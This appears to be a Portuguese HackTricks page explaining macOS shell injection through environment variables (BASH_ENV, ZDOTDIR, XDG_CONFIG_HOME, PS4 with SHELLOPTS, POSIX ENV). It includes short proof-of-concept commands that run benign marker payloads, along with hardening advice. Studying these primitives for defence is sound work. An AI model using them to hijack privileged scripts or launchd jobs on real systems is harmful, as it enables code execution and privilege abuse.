# Injeção em Aplicações Shell do macOS

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

Quando o Bash é iniciado de forma não interativa para executar um script ou comando `-c`, ele expande o valor de `BASH_ENV` e obtém o arquivo resultante antes de executar o comando solicitado. O Bash não usa `PATH` para localizar esse arquivo. Portanto, um processo que inicia o Bash não interativo com variáveis de ambiente controladas pelo atacante pode ser induzido a executar primeiro um payload de shell legível.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```
O hook é executado somente quando o alvo realmente inicia o Bash; `/bin/sh` em outra plataforma ou um programa que executa um comando sem um shell não necessariamente o respeitará. O Bash em privileged mode ignora `BASH_ENV`. Quando os IDs efetivo e real de usuário/grupo são diferentes, o Bash também ignora os startup files e redefine os IDs efetivos, a menos que `-p` seja fornecido; com `-p`, o privileged mode permanece habilitado e `BASH_ENV` continua sendo ignorado.<sup>[[1]](#references)[[2]](#references)</sup>

No macOS, os jobs do `launchd` podem definir variáveis de ambiente herdadas ou específicas de cada job; portanto, inspecione os plists e os contextos de inicialização que alimentam scripts privilegiados. Não dependa apenas do SIP para sanitizar variáveis do interpretador: use um ambiente mínimo (`env -i`), remova explicitamente `BASH_ENV`, invoque o interpretador pretendido usando seu caminho absoluto e evite startup files graváveis.

## zsh `ZDOTDIR`

O zsh lê `$ZDOTDIR/.zshenv` para todo shell normal, incluindo shells não interativos; se `ZDOTDIR` não estiver definido, ele usará `HOME`. Redirecionar `ZDOTDIR` para um diretório gravável, portanto, executa seu `.zshenv` antes de um comando ou script `zsh -c`.<sup>[[3]](#references)</sup>
```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```
`zsh -f` desativa a opção `RCS` e ignora este arquivo de inicialização do usuário. O `/etc/zshenv` global ainda é lido, portanto deve permanecer confiável e mínimo.

## fish `XDG_CONFIG_HOME`

fish lê `$XDG_CONFIG_HOME/fish/conf.d/*.fish` e `$XDG_CONFIG_HOME/fish/config.fish` na inicialização de todo shell, não apenas de shells interativos ou de login. Ele também executa `fish/vendor_conf.d/*.fish` abaixo das entradas em `XDG_DATA_DIRS`. Um atacante que controle uma dessas variáveis e um diretório legível pode, portanto, executar código antes de um script fish ou de um comando `-c`.<sup>[[4]](#references)</sup>
```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```
Use `fish --no-config` para uma invocação confiável e limpe as variáveis de caminho XDG não confiáveis.

## bash `PS4` + xtrace (`SHELLOPTS`)

Quando o Bash é executado com a opção **xtrace**, antes de cada comando rastreado ele expande `PS4` e o imprime. `PS4` é expandido como qualquer prompt, portanto uma **command substitution** dentro dele é executada. Tanto o valor de `PS4` **quanto** a forma como o xtrace é habilitado podem vir exclusivamente do ambiente: exportar `SHELLOPTS=xtrace` habilita o xtrace para um `bash script.sh` normal (sem precisar da flag `-x`). Isso transforma qualquer script Bash executado pela vítima em execução de código.<sup>[[5]](#references)</sup>
```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` sozinho não faz nada até que o xtrace seja habilitado (via `SHELLOPTS=xtrace`, `set -x` ou `bash -x`). O Bash ignora `SHELLOPTS` no **modo privilegiado** (IDs real/efetivo diferentes sem o tratamento de `-p`), portanto as mesmas ressalvas de setuid aplicáveis a `BASH_ENV` também se aplicam.

## POSIX `ENV`

Os shells no estilo POSIX (`/bin/sh`, `dash`, `ksh`) leem a variável `ENV`, expandem-na e fazem source do arquivo resultante quando iniciam um shell **interativo**. Ela é a contraparte POSIX de `BASH_ENV` (que é acionada para o Bash *não interativo*); portanto, controlar `ENV` executa código sempre que uma vítima inicia um `sh`/`dash` interativo.
```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```
## References

- [1] [Arquivos de inicialização do Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Invocando o Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [Arquivos de inicialização/desligamento do zsh](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [Arquivos de configuração do fish](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Variáveis do Bash — `PS4` e o builtin Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
{{#include ../../../banners/hacktricks-training.md}}
